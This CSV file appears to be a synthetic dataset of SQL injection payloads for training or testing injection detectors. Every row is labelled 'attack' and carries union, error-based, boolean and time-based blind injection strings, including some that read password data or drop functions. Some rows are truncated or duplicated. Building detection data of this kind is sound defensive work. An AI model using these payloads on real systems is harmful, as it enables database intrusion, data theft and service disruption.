id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001540,attack,error,"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",nearest_attack_euclidean,R003385,2.972404224911364
CTGAN_001541,attack,boolean,"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",nearest_attack_euclidean,R004794,2.9720841750936344
CTGAN_001542,attack,other,select name from syscolumns where id   =     (  sele ...,nearest_attack_euclidean,R000440,3.3566819212428127
CTGAN_001543,attack,boolean,"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R007875,2.9054992791229357
CTGAN_001544,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,2.399206978652558
CTGAN_001545,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",nearest_attack_euclidean,R005121,4.186056421219171
CTGAN_001546,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R004767,3.9040662762928564
CTGAN_001547,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R002117,3.726442120649475
CTGAN_001548,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R004346,4.157146316406421
CTGAN_001549,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001643,7.810056011783364
CTGAN_001550,attack,boolean,"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004574,1.7668975962044098
CTGAN_001551,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,2.685540102713237
CTGAN_001552,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R003075,5.179936438006028
CTGAN_001553,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R004049,2.986740147829538
CTGAN_001554,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,2.541728140210065
CTGAN_001555,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R004331,2.977263072463867
CTGAN_001556,attack,union,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",nearest_attack_euclidean,R000886,16.727576355723826
CTGAN_001557,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R007727,4.666819780268361
CTGAN_001558,attack,boolean,"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003511,4.982820442077576
CTGAN_001559,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R001852,3.0980629505405526
CTGAN_001560,attack,boolean,"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R008836,7.046919194546975
CTGAN_001561,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,7.910332381696601
CTGAN_001562,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,8.446510419781395
CTGAN_001563,attack,error,1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004777,4.287392383764551
CTGAN_001564,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004448,3.138495783889612
CTGAN_001565,attack,boolean,"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""hmun""  =  ""hmun",nearest_attack_euclidean,R005486,4.97385208853433
CTGAN_001566,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001838,3.108584240472424
CTGAN_001567,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000385,20.057568785721593
CTGAN_001568,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R007582,3.6970929883638535
CTGAN_001569,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R004533,1.455638950717142
CTGAN_001570,attack,error,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,nearest_attack_euclidean,R008401,4.551339761622139
CTGAN_001571,attack,boolean,1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R007000,3.594680585010159
CTGAN_001572,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,3.0901419361565132
CTGAN_001573,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R001174,4.341569664992476
CTGAN_001574,attack,boolean,"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",nearest_attack_euclidean,R008008,5.887520918914581
CTGAN_001575,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,3.0977738415580225
CTGAN_001576,attack,other,-6984 order by 1#,nearest_attack_euclidean,R005078,5.078412073171966
CTGAN_001577,attack,boolean,"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006704,2.706344868630427
CTGAN_001578,attack,boolean,"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",nearest_attack_euclidean,R000979,8.203340082573911
CTGAN_001579,attack,time,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,nearest_attack_euclidean,R003815,4.272916057634182
CTGAN_001580,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,5.6366039459198705
CTGAN_001581,attack,union,"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",nearest_attack_euclidean,R003571,4.93314572860832
CTGAN_001582,attack,boolean,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",nearest_attack_euclidean,R004989,2.948550135044158
CTGAN_001583,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,3.5336386213326008
CTGAN_001584,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,2.681607008262021
CTGAN_001585,attack,other,"1""  )   as ranl where 5553  =  5553",nearest_attack_euclidean,R007510,0.9153035702051892
CTGAN_001586,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",nearest_attack_euclidean,R001452,2.4775786084627676
CTGAN_001587,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R004533,2.149606914842658
CTGAN_001588,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R006827,3.9268286420381
CTGAN_001589,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R005606,3.9122085536141915
CTGAN_001590,attack,time,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",nearest_attack_euclidean,R003231,5.5367270114366995
CTGAN_001591,attack,other,"1"" where 4281  =  4281",nearest_attack_euclidean,R000669,3.911479121904025
CTGAN_001592,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R005725,3.656586732745497
CTGAN_001593,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R007830,4.719806922373256
CTGAN_001594,attack,boolean,"1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950",nearest_attack_euclidean,R007834,4.156235018104065
CTGAN_001595,attack,boolean,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003755,1.3648917223368302
CTGAN_001596,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,1.9571733016111859
CTGAN_001597,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R007927,4.206169107375168
CTGAN_001598,attack,boolean,1'  )   and   (  7603  =  3634  )  *3634,nearest_attack_euclidean,R000766,2.9219682309479285
CTGAN_001599,attack,other,or,nearest_attack_euclidean,R000581,3.3421118851496256
CTGAN_001600,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,4.882006044634496
CTGAN_001601,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R002026,3.4150019983299726
CTGAN_001602,attack,union,"1'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R005850,4.0219758490179585
CTGAN_001603,attack,other,1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R005616,3.45633343145754
CTGAN_001604,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,2.6328111468248223
CTGAN_001605,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.7100777250456383
CTGAN_001606,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R005888,4.122811504570297
CTGAN_001607,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R006453,3.0581144335671224
CTGAN_001608,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",nearest_attack_euclidean,R000813,10.691153538772145
CTGAN_001609,attack,boolean,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'javh'  =  'javh",nearest_attack_euclidean,R008985,5.353409541039666
CTGAN_001610,attack,union,"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",nearest_attack_euclidean,R003571,5.131615679989478
CTGAN_001611,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R007433,3.202541980667666
CTGAN_001612,attack,boolean,"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006683,3.132556897262522
CTGAN_001613,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R002099,3.9539709996516836
CTGAN_001614,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,4.208337792240012
CTGAN_001615,attack,boolean,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002947,4.205789440445044
CTGAN_001616,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",nearest_attack_euclidean,R005121,4.898381028636539
CTGAN_001617,attack,time,1'  )   or sleep  (  5  ) ,nearest_attack_euclidean,R002985,3.2668436138388155
CTGAN_001618,attack,time,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R005074,4.515878027679524
CTGAN_001619,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,3.782231346267265
CTGAN_001620,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.151552167913257
CTGAN_001621,attack,other,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   # mekk,nearest_attack_euclidean,R005094,3.545823358625835
CTGAN_001622,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,3.2357455453389647
CTGAN_001623,attack,boolean,-2761 or 1144  =  7657-- mfml,nearest_attack_euclidean,R001678,2.3356034053183676
CTGAN_001624,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R002385,4.532184754469033
CTGAN_001625,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R001099,2.9240281080562105
CTGAN_001626,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004090,6.344216540565323
CTGAN_001627,attack,boolean,"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R005618,4.818280248869329
CTGAN_001628,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R004049,4.459757704933524
CTGAN_001629,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,1.8959587957112662
CTGAN_001630,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,2.535097059536402
CTGAN_001631,attack,other,"1""   )    )    as ikuz where 7385  =  7385",nearest_attack_euclidean,R007448,3.3580560900794763
CTGAN_001632,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001414,5.9051528739550925
CTGAN_001633,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3",nearest_attack_euclidean,R003440,3.593532816792639
CTGAN_001634,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",nearest_attack_euclidean,R008901,2.7319378719957705
CTGAN_001635,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R007076,1.9154335809971463
CTGAN_001636,attack,union,"-4915' union all select 1928,1928,1928,1928#",nearest_attack_euclidean,R006027,3.841983033930695
CTGAN_001637,attack,error,"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R002480,5.595020437842718
CTGAN_001638,attack,union,"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",nearest_attack_euclidean,R004240,3.2551419077549637
CTGAN_001639,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R004094,3.951729359807133
CTGAN_001640,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001838,4.8686702163893205
CTGAN_001641,attack,union,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R003122,7.551971574521125
CTGAN_001642,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",nearest_attack_euclidean,R008343,3.7250273280234643
CTGAN_001643,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",nearest_attack_euclidean,R004226,1.7749732351050258
CTGAN_001644,attack,error,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",nearest_attack_euclidean,R007792,3.438762867329057
CTGAN_001645,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R005116,4.4324067353292
CTGAN_001646,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,3.904244498079655
CTGAN_001647,attack,other,1   )    )    as svhd where 9761  =  9761,nearest_attack_euclidean,R003978,2.478069508374138
CTGAN_001648,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R001522,3.787365961629537
CTGAN_001649,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R003740,4.451351738409426
CTGAN_001650,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,4.872277200103482
CTGAN_001651,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R005987,5.1970731728027415
CTGAN_001652,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R004242,3.9596326072655867
CTGAN_001653,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,1.9838232689186703
CTGAN_001654,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.3544350660430264
CTGAN_001655,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R006276,4.11643108544978
CTGAN_001656,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003923,4.260581688311563
CTGAN_001657,attack,boolean,"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",nearest_attack_euclidean,R005757,4.286965580251746
CTGAN_001658,attack,other,1   )    )    as syot where 1199  =  1199,nearest_attack_euclidean,R005149,2.719188517011262
CTGAN_001659,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R005053,3.316835984694683
CTGAN_001660,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,7.529024208075538
CTGAN_001661,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002095,4.501141026249411
CTGAN_001662,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R007942,25.411472056699814
CTGAN_001663,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R004851,5.911255833461887
CTGAN_001664,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R005320,3.0252310825924615
CTGAN_001665,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,5.621902059729118
CTGAN_001666,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000438,5.020515705131295
CTGAN_001667,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R006315,3.7438986319397136
CTGAN_001668,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R004523,4.243437051290657
CTGAN_001669,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000893,3.155696446493025
CTGAN_001670,attack,time,select sleep  (  5  )   and 'hhrw' like 'hhrw,nearest_attack_euclidean,R007915,3.0274140073535416
CTGAN_001671,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R003229,4.344074239568641
CTGAN_001672,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R001569,3.4684492883146376
CTGAN_001673,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.3447248582469356
CTGAN_001674,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000410,4.011107044589262
CTGAN_001675,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,2.4173377540251564
CTGAN_001676,attack,boolean,"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",nearest_attack_euclidean,R006861,4.241449965421917
CTGAN_001677,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R002290,5.348559469172457
CTGAN_001678,attack,boolean,"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000756,2.043688694540798
